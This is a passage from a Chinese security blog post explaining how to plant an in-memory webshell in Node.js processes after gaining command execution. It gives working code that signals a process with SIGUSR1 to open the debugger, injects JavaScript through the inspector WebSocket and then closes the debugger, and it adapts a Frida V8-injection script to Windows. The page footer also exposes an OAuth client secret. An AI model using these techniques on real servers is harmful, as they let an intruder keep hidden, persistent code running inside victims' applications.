+<h1 id="情况3-为system命令执行"><a href="#情况3-为system命令执行" class="headerlink" title="情况3 (为system命令执行)"></a>情况3 (为system命令执行)</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; execSync &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">executeUserCode</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> stdout = <span class="title function_">execSync</span>(code, &#123; <span class="attr">timeout</span>: <span class="number">10000</span>, <span class="attr">maxBuffer</span>: <span class="number">20</span> * <span class="number">1024</span> * <span class="number">1024</span>, <span class="attr">shell</span>: <span class="string">&#x27;/bin/bash&#x27;</span> &#125;);</span><br><span class="line">    <span class="keyword">return</span> stdout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">executeUserCode,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>在这种情况下应该怎么注入内存马<br>要注入内存马，首先就是要能执行js代码<br>这里找到一个方法</p>
+<p><a target="_blank" rel="noopener" href="https://nodejs.org/api/process.html">https://nodejs.org/api/process.html</a></p>
+<p>‘SIGUSR1’ is reserved by Node.js to start the debugger. It’s possible to install a listener but doing so might interfere with the debugger.<br>当kill -SIGUSR1 nodepid<br>即可开启debug端口，不用在启动的时候命令行去开启</p>
+<p>而inspect和debug端口交互方式是websocket<br>首先通过访问h ttp://127.0.0.1:9229/json/list 得到调试uuid</p>
+<p>我这边就不用chrome的官方工具去进行调试了，写了一套websocket代码去模拟协议执行代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">process.<span class="title function_">kill</span>(pid, <span class="string">&quot;SIGUSR1&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`已发送 SIGUSR1 到 PID <span class="subst">$&#123;pid&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 等待 500ms 给 inspector 启动时间</span></span><br><span class="line"><span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">r</span> =&gt;</span> <span class="built_in">setTimeout</span>(r, <span class="number">500</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 请求 inspector json 列表</span></span><br><span class="line"><span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;http://127.0.0.1:9229/json/list&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> list = <span class="keyword">await</span> res.<span class="title function_">json</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到对应进程的 ws 地址（简单用第一个）</span></span><br><span class="line"><span class="keyword">if</span> (!list || !list.<span class="property">length</span>) <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;没有 inspector 实例&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> wsUrl = list[<span class="number">0</span>].<span class="property">webSocketDebuggerUrl</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`PID <span class="subst">$&#123;pid&#125;</span> 的 WS URL: <span class="subst">$&#123;wsUrl&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 连接 WebSocket 执行 Runtime.evaluate（关闭调试器 / 修改变量等）</span></span><br><span class="line"><span class="keyword">const</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(wsUrl);</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">on</span>(<span class="string">&quot;open&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Connected to PID <span class="subst">$&#123;pid&#125;</span> inspector`</span>);</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&quot;Runtime.evaluate&quot;</span>,</span><br><span class="line">    <span class="attr">params</span>: &#123;</span><br><span class="line">    <span class="attr">expression</span>: <span class="string">`global.b = 123;`</span>, <span class="comment">// 这里输入前面情况2的代码即可</span></span><br><span class="line">    <span class="attr">awaitPromise</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br><span class="line"><span class="comment">// 直接关闭调试器</span></span><br><span class="line">ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&quot;Runtime.evaluate&quot;</span>,</span><br><span class="line">    <span class="attr">params</span>: &#123;</span><br><span class="line">    <span class="attr">expression</span>: <span class="string">&quot;process._debugEnd();&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">on</span>(<span class="string">&quot;message&quot;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">const</span> msg = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data);</span><br><span class="line"><span class="keyword">if</span> (msg.<span class="property">id</span> === <span class="number">1</span>) <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`PID <span class="subst">$&#123;pid&#125;</span> Debug mode closed`</span>);</span><br><span class="line"><span class="keyword">if</span> (msg.<span class="property">id</span> === <span class="number">2</span>) <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`PID <span class="subst">$&#123;pid&#125;</span> variable modified`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">on</span>(<span class="string">&quot;close&quot;</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`PID <span class="subst">$&#123;pid&#125;</span> inspector connection closed`</span>));</span><br><span class="line">ws.<span class="title function_">on</span>(<span class="string">&quot;error&quot;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`PID <span class="subst">$&#123;pid&#125;</span> WS error:`</span>, err.<span class="property">message</span>));</span><br></pre></td></tr></table></figure><br>这websocket链接有个小问题，无法require，但是我没有自信研究，感兴趣的可以抓包去看inspect工具是怎么去require的</p>
+<h1 id="情况4-为windows命令执行"><a href="#情况4-为windows命令执行" class="headerlink" title="情况4 (为windows命令执行)"></a>情况4 (为windows命令执行)</h1><p>在情况3中，可以通过kill -SIGUSR1 pid去发送进程信号<br>但是在windows中就不可以了<br>这里我提供的方案是用frida去注入v8环境，然后执行命令<br><a target="_blank" rel="noopener" href="https://frida.re/docs/examples/javascript/">https://frida.re/docs/examples/javascript/</a><br>但是这里也有一个问题，这个脚本只能适配linux环境<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> uv_default_loop = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Module</span>.<span class="title function_">getGlobalExportByName</span>(<span class="string">&#x27;uv_default_loop&#x27;</span>), <span class="string">&#x27;pointer&#x27;</span>, []);</span><br><span class="line"><span class="keyword">const</span> uv_async_init = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Module</span>.<span class="title function_">getGlobalExportByName</span>(<span class="string">&#x27;uv_async_init&#x27;</span>), <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"><span class="keyword">const</span> uv_async_send = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Module</span>.<span class="title function_">getGlobalExportByName</span>(<span class="string">&#x27;uv_async_send&#x27;</span>), <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"><span class="keyword">const</span> uv_close = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Module</span>.<span class="title function_">getGlobalExportByName</span>(<span class="string">&#x27;uv_close&#x27;</span>), <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"><span class="keyword">const</span> uv_unref = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Module</span>.<span class="title function_">getGlobalExportByName</span>(<span class="string">&#x27;uv_unref&#x27;</span>), <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> v8_Isolate_GetCurrent = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Module</span>.<span class="title function_">getGlobalExportByName</span>(<span class="string">&#x27;_ZN2v87Isolate10GetCurrentEv&#x27;</span>), <span class="string">&#x27;pointer&#x27;</span>, []);</span><br><span class="line"><span class="keyword">const</span> v8_Isolate_GetCurrentContext = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Module</span>.<span class="title function_">getGlobalExportByName</span>(<span class="string">&#x27;_ZN2v87Isolate17GetCurrentContextEv&#x27;</span>), <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> v8_HandleScope_init = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Module</span>.<span class="title function_">getGlobalExportByName</span>(<span class="string">&#x27;_ZN2v811HandleScopeC1EPNS_7IsolateE&#x27;</span>), <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"><span class="keyword">const</span> v8_HandleScope_finalize = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Module</span>.<span class="title function_">getGlobalExportByName</span>(<span class="string">&#x27;_ZN2v811HandleScopeD1Ev&#x27;</span>), <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> v8_String_NewFromUtf8 = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Module</span>.<span class="title function_">getGlobalExportByName</span>(<span class="string">&#x27;_ZN2v86String11NewFromUtf8EPNS_7IsolateEPKcNS_13NewStringTypeEi&#x27;</span>), <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> v8_Script_Compile = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Module</span>.<span class="title function_">getGlobalExportByName</span>(<span class="string">&#x27;_ZN2v86Script7CompileENS_5LocalINS_7ContextEEENS1_INS_6StringEEEPNS_12ScriptOriginE&#x27;</span>), <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"><span class="keyword">const</span> v8_Script_Run = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Module</span>.<span class="title function_">getGlobalExportByName</span>(<span class="string">&#x27;_ZN2v86Script3RunENS_5LocalINS_7ContextEEE&#x27;</span>), <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">NewStringType</span> = &#123;</span><br><span class="line">  <span class="attr">kNormal</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">kInternalized</span>: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pending = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> processPending = <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> isolate = <span class="title function_">v8_Isolate_GetCurrent</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> scope = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="title function_">v8_HandleScope_init</span>(scope, isolate);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> context = <span class="title function_">v8_Isolate_GetCurrentContext</span>(isolate);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (pending.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> item = pending.<span class="title function_">shift</span>();</span><br><span class="line">    <span class="keyword">const</span> source = <span class="title function_">v8_String_NewFromUtf8</span>(isolate, <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(item), <span class="title class_">NewStringType</span>.<span class="property">kNormal</span>, -<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">const</span> script = <span class="title function_">v8_Script_Compile</span>(context, source, <span class="variable constant_">NULL</span>);</span><br><span class="line">    <span class="keyword">const</span> result = <span class="title function_">v8_Script_Run</span>(script, context);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">v8_HandleScope_finalize</span>(scope);</span><br><span class="line">&#125;, <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> onClose = <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Script</span>.<span class="title function_">unpin</span>();</span><br><span class="line">&#125;, <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> handle = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="title function_">uv_async_init</span>(<span class="title function_">uv_default_loop</span>(), handle, processPending);</span><br><span class="line"><span class="title function_">uv_unref</span>(handle);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Script</span>.<span class="title function_">bindWeak</span>(handle, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title class_">Script</span>.<span class="title function_">pin</span>();</span><br><span class="line">  <span class="title function_">uv_close</span>(handle, onClose);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">run</span>(<span class="params">source</span>) &#123;</span><br><span class="line">  pending.<span class="title function_">push</span>(source);</span><br><span class="line">  <span class="title function_">uv_async_send</span>(handle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">run</span>(<span class="string">&#x27;console.log(&quot;Hello from Frida&quot;);&#x27;</span>);</span><br></pre></td></tr></table></figure><br>官方代码如上<br>首先就是要改成windows的符号名</p>
+<p>这里拿一个函数来举例<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> v8_String_NewFromUtf8 = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Module</span>.<span class="title function_">getGlobalExportByName</span>(<span class="string">&#x27;_ZN2v86String11NewFromUtf8EPNS_7IsolateEPKcNS_13NewStringTypeEi&#x27;</span>), <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]);</span><br></pre></td></tr></table></figure><br>windows的改造如下</p>
+<p>打开ida分析node.exe，标识符如下<br><img src="https://youke1.picui.cn/s1/2025/10/15/68ee7c1a456f0.png" alt></p>
+<p>参数参考源码<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">MaybeLocal&lt;String&gt; <span class="title">String::NewFromUtf8</span><span class="params">(Isolate* v8_isolate, <span class="type">const</span> <span class="type">char</span>* data,</span></span></span><br><span class="line"><span class="params"><span class="function">                                       NewStringType type, <span class="type">int</span> length)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">NEW_STRING</span>(v8_isolate, String, NewFromUtf8, <span class="type">char</span>, data, type, length);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>NewStringType 源码如下，属于enum类型，在底层就属于int类型<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum class</span> <span class="title class_">NewStringType</span> &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Create a new string, always allocating new storage memory.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  kNormal,</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Acts as a hint that the string should be created in the</span></span><br><span class="line"><span class="comment">   * old generation heap space and be deduplicated if an identical string</span></span><br><span class="line"><span class="comment">   * already exists.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  kInternalized</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br>但是光看源码是不够的，在windows，编译器会对参数的返回值进行优惠，可能会优化到传入参数上<br>如下图<br><img src="https://youke1.picui.cn/s1/2025/10/15/68ee75050154c.png" alt><br>可以看到有5个参数，那第一个参数就是那个返回值，并且第2个参数虽然显示的是__int64参数，但是看到他的实际使用情况如下<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_WORD *)(a2 + <span class="number">440</span>) = <span class="number">5</span></span><br></pre></td></tr></table></figure><br>其实是在对地址进行操作，并解引用，所以还是指针类型</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> v8_String_NewFromUtf8 = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="literal">null</span>, <span class="string">&#x27;?NewFromUtf8@String@v8@@SA?AV?$MaybeLocal@VString@v8@@@2@PEAVIsolate@2@PEBDW4NewStringType@2@H@Z&#x27;</span>), <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]);</span><br><span class="line"><span class="title function_">v8_Script_Compile</span>(ptr_script, context, source, <span class="variable constant_">NULL</span>);</span><br><span class="line"><span class="keyword">const</span> script = ptr_script.<span class="title function_">readPointer</span>(); <span class="comment">//读取第一个参数的实际值</span></span><br></pre></td></tr></table></figure>
+<p>剩下的就和前面相同了</p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/nodejs/" rel="tag"># nodejs</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/09/17/java%E5%9F%BA%E7%A1%80/" rel="prev" title="java基础">
+      <i class="fa fa-chevron-left"></i> java基础
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%83%85%E5%86%B51-app%E4%B8%BA%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="nav-number">1.</span> <span class="nav-text">情况1 (app为全局变量)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%83%85%E5%86%B52-app%E4%B8%BA%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F"><span class="nav-number">2.</span> <span class="nav-text">情况2 (app为局部变量)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%83%85%E5%86%B53-%E4%B8%BAsystem%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">3.</span> <span class="nav-text">情况3 (为system命令执行)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%83%85%E5%86%B54-%E4%B8%BAwindows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">4.</span> <span class="nav-text">情况4 (为windows命令执行)</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="kaikaix"
+      src="/images/cat.jpg">
+  <p class="site-author-name" itemprop="name">kaikaix</p>
+  <div class="site-description" itemprop="description">小白</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">48</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kaikaix</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'e015cfd8a7113f83449a',
+      clientSecret: 'ead135fac6fb19fb1953358c28ee9b0dc1625f9a',
+      repo        : 'kaikaix.github.io',
+      owner       : 'kaikaix',
+      admin       : ['kaikaix'],
+      id          : 'dd45798ae9ebf49fcb41589766b95895',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
